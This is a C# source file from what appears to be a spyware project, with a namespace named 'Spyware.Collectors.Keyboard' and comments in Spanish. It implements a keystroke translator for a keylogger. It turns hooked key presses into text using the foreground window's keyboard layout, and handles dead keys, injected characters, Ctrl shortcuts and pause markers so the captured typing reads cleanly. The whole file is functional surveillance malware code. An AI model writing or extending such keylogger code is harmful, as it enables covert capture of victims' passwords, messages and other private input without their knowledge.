using System.Runtime.InteropServices;
using System.Text;

namespace Spyware.Collectors.Keyboard;

/// <summary>Resultado de traducir una pulsación: texto escrito, marcador o nada.</summary>
public readonly record struct KeyTranslation
{
    /// <summary>Caracteres producidos (vacío si la tecla no escribe).</summary>
    public string Text { get; init; }

    /// <summary>Marcador legible para teclas sin glifo: <c>[enter]</c>, <c>[f5]</c>…</summary>
    public string Token { get; init; }

    /// <summary>Mayúsculas, Ctrl, Alt, Win…: no generan evento por sí solas.</summary>
    public bool IsModifier { get; init; }

    /// <summary>Retroceso: el servicio decide si borra el último carácter o anota la tecla.</summary>
    public bool IsBackspace { get; init; }

    public KeyTranslation()
    {
        Text = string.Empty;
        Token = string.Empty;
        IsModifier = false;
        IsBackspace = false;
    }

    public bool ProducesSomething => Text.Length > 0 || Token.Length > 0;
}

/// <summary>
/// Traduce códigos virtuales a texto con la API de Windows: <c>ToUnicodeEx</c> usando
/// el reparto de teclado REAL de la ventana en primer plano (<c>GetKeyboardLayout</c>
/// del hilo de esa ventana), <c>GetKeyboardState</c> para Mayús/Ctrl/Alt y una tabla
/// propia para las teclas que no escriben un glifo.
/// </summary>
public static class KeyTranslator
{
    public const int VkBack = 0x08;
    public const int VkTab = 0x09;
    public const int VkReturn = 0x0D;
    public const int VkControl = 0x11;
    public const int VkEscape = 0x1B;
    public const int VkSpace = 0x20;
    public const int VkDelete = 0x2E;

    /// <summary>
    /// VK_PACKET: carácter inyectado (dictado, IME, Escritorio remoto, SendInput con
    /// KEYEVENTF_UNICODE). El glifo viene en el campo de escaneo, no se traduce por VK.
    /// </summary>
    public const int VkPacket = 0xE7;

    private const uint KbExtended = 0x01;
    private const uint KbAltDown = 0x20;
    private const uint ExtendedScanBit = 0x0100;
    private const int GlyphBufferCharacters = 8;

    /// <summary>Códigos virtuales que no producen glifo por sí mismos.</summary>
    private static readonly HashSet<int> ModifierVks = new()
    {
        0x10, 0xA0, 0xA1,       // Mayús
        0x11, 0xA2, 0xA3,       // Ctrl
        0x12, 0xA4, 0xA5,       // Alt
        0x5B, 0x5C, 0x5D,       // Win izquierdo/derecho, Aplicaciones
        0x14, 0x90, 0x91        // Bloq Mayús, Bloq Número, Bloq Despl
    };

    /// <summary>Teclas sin glifo que se anotan con un marcador legible.</summary>
    private static readonly Dictionary<int, string> SpecialTokens = new()
    {
        [0x08] = "[back]",
        [0x09] = "[tab]",
        [0x0D] = "[enter]",
        [0x1B] = "[esc]",
        [0x21] = "[pgup]",
        [0x22] = "[pgdn]",
        [0x23] = "[fin]",
        [0x24] = "[inicio]",
        [0x25] = "[izq]",
        [0x26] = "[arriba]",
        [0x27] = "[der]",
        [0x28] = "[abajo]",
        [0x2A] = "[impr]",
        [0x2C] = "[impr-pant]",
        [0x2D] = "[ins]",
        [0x2E] = "[supr]",
        [0x2F] = "[ayuda]",
        [0x6A] = "[*]",
        [0x6B] = "[+]",
        [0x6D] = "[-]",
        [0x6E] = "[.]",
        [0x6F] = "[/]",
        [0x70] = "[f1]", [0x71] = "[f2]", [0x72] = "[f3]", [0x73] = "[f4]",
        [0x74] = "[f5]", [0x75] = "[f6]", [0x76] = "[f7]", [0x77] = "[f8]",
        [0x78] = "[f9]", [0x79] = "[f10]", [0x7A] = "[f11]", [0x7B] = "[f12]",
        [0x7C] = "[f13]", [0x7D] = "[f14]", [0x7E] = "[f15]", [0x7F] = "[f16]",
        [0x80] = "[f17]", [0x81] = "[f18]", [0x82] = "[f19]", [0x83] = "[f20]",
        [0x84] = "[f21]", [0x85] = "[f22]", [0x86] = "[f23]", [0x87] = "[f24]"
    };

    /// <summary>
    /// Traduce una pulsación. <paramref name="flags"/> son los banderines de
    /// <c>KBDLLHOOKSTRUCT</c> (tecla extendida, Alt pulsado), que cambian el escaneo real.
    /// </summary>
    public static KeyTranslation Translate(int virtualKey, uint scanCode, uint flags, bool recordSpecialKeys)
    {
        if (ModifierVks.Contains(virtualKey))
            return new KeyTranslation { IsModifier = true };

        if (virtualKey == VkPacket)
        {
            // Con KEYEVENTF_UNICODE cada unidad UTF-16 llega en su propia pulsación
            // (un emoji son dos), así que el escaneo se toma como carácter, no como UCS-4.
            char injected = (char)(scanCode & 0xFFFFu);
            return char.IsControl(injected) && injected != '\t'
                ? new KeyTranslation()
                : new KeyTranslation { Text = injected.ToString() };
        }

        if (virtualKey == VkSpace)
            return new KeyTranslation { Text = " " };

        if (virtualKey == VkBack)
            return new KeyTranslation { IsBackspace = true, Token = Token(recordSpecialKeys, "[back]") };

        bool altDown = (flags & KbAltDown) != 0;
        bool ctrlDown = IsDown(VkControl);

        // Primero la tabla: Enter, Tabulador o F5 deben quedar como marcador legible
        // en lugar del carácter de control que devuelve ToUnicodeEx para esas teclas.
        if (SpecialTokens.TryGetValue(virtualKey, out string? token))
            return new KeyTranslation { Token = Token(recordSpecialKeys, token) };

        KeyTranslation typed = FromUnicode(virtualKey, scanCode, flags, recordSpecialKeys);
        if (typed.ProducesSomething)
            return typed;

        // Atajos Ctrl+letra/dígito: ToUnicodeEx devuelve un carácter de control inútil.
        if (ctrlDown && !altDown)
        {
            char letter = LetterFor(virtualKey);
            if (letter != '\0')
                return new KeyTranslation { Token = Token(recordSpecialKeys, "[ctrl-" + letter + "]") };
        }

        return typed;
    }

    /// <summary>
    /// <c>ToUnicodeEx</c> devuelve 1 o 2 caracteres, 0 si la tecla no escribe, o negativo
    /// si es una tecla muerta pendiente. Con teclas muertas se limpia el estado interno
    /// llamando otra vez con Esc y banderín 1, como documenta MSDN.
    /// </summary>
    private static KeyTranslation FromUnicode(int virtualKey, uint scanCode, uint flags, bool recordSpecialKeys)
    {
        byte[] state = new byte[256];
        if (!GetKeyboardState(state))
            return new KeyTranslation();

        try
        {
            // El reparto correcto es el del hilo de la ventana en primer plano.
            IntPtr window = GetForegroundWindow();
            uint thread = window == IntPtr.Zero ? 0u : GetWindowThreadProcessId(window, IntPtr.Zero);
            IntPtr layout = GetKeyboardLayout(thread);

            // El bit extendido va en el escaneo, no en el código virtual.
            uint scan = (scanCode & 0xFFu) | ((flags & KbExtended) != 0 ? ExtendedScanBit : 0u);

            var buffer = new StringBuilder(GlyphBufferCharacters);
            int written = ToUnicodeEx((uint)virtualKey, scan, state, buffer, buffer.Capacity, 0, layout);

            if (written < 0)
            {
                // Se descarta el estado acumulado de la tecla muerta; el resultado no importa.
                var discard = new StringBuilder(GlyphBufferCharacters);
                _ = ToUnicodeEx(VkEscape, 0x01, state, discard, discard.Capacity, 1, layout);

                return new KeyTranslation { Token = Token(recordSpecialKeys, "[muerta]") };
            }

            if (written == 0)
                return new KeyTranslation();

            string text = buffer.ToString();

            if (text.Length > written)
                text = text[..written];

            // AltGr (Ctrl+Alt en layouts es-ES/es-LA) ya lo resuelve ToUnicodeEx:
            // no lo tratamos como atajo de Control.
            return new KeyTranslation { Text = text };
        }
        catch (Exception ex) when (ex is DllNotFoundException or EntryPointNotFoundException or
                                   System.Runtime.InteropServices.MarshalDirectiveException)
        {
            // Sesión sin escritorio o API no disponible: mejor no capturar que romper el ciclo.
            return new KeyTranslation();
        }
    }

    /// <summary>
    /// Marcador de separación entre dos ráfagas de la misma ventana separadas por una
    /// pausa larga: conserva el orden temporal dentro del mismo texto guardado.
    /// </summary>
    public static string Separator(int seconds) =>
        seconds <= 0 ? string.Empty : "[pausa " + seconds + "s]";

    private static string Token(bool enabled, string token) => enabled ? token : string.Empty;

    private static char LetterFor(int virtualKey)
    {
        if (virtualKey is >= 0x41 and <= 0x5A) return (char)('a' + virtualKey - 0x41);
        if (virtualKey is >= 0x30 and <= 0x39) return (char)('0' + virtualKey - 0x30);
        return '\0';
    }

    private static bool IsDown(int virtualKey) => (GetAsyncKeyState(virtualKey) & 0x8000) != 0;

    // ---------- API de Windows ----------

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int virtualKey);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx", CharSet = CharSet.Unicode)]
    private static extern int ToUnicodeEx(
        uint wVirtKey, uint wScanCode, byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
        int cchBuff, uint wFlags, IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);
}
